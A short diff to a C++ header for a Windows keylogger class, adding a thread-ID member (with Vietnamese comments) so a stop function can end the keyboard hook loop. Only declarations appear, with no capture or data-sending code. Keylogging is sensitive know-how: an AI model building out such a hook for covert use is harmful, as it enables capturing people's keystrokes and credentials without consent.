@@ -1,4 +1,4 @@
-#pragma once
+﻿#pragma once
 #include <string>
 #include <vector>
 #include <mutex>
@@ -21,6 +21,10 @@ private:
 
     // Handle cua Hook
     HHOOK _hook;
+
+    // [MỚI] ID của thread chứa vòng lặp Hook.
+    // Cần thiết để hàm StopKeyLogging có thể gửi tin nhắn WM_QUIT vào đúng thread này.
+    DWORD _threadId;
 
     // Cac ham phu tro (Helper)
     void RunHookLoop(); // Vong lap chinh cua Keylogger
